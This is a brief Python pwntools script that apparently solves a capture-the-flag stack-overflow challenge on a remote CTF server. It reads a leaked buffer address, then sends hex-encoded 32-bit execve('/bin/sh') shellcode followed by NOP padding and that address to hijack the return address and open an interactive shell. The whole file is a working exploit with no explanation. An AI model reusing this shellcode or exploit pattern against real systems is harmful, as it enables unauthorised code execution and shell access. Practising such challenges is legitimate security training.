from pwn import *

#p=process("./Simple_overflow_ver_2")
p=remote("ctf.j0n9hyun.xyz", 3006)

p.recvuntil("Data : ")
p.sendline("aaaa")
buf_addr=int(p.recv(10),16)
p.recvuntil("Again (y/n): ")
p.sendline('y')
p.recvuntil("Data : ")

payload="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" # 25bit
payload+='\x90'*0x73
payload+=p32(buf_addr)

p.sendline(payload)
p.interactive()
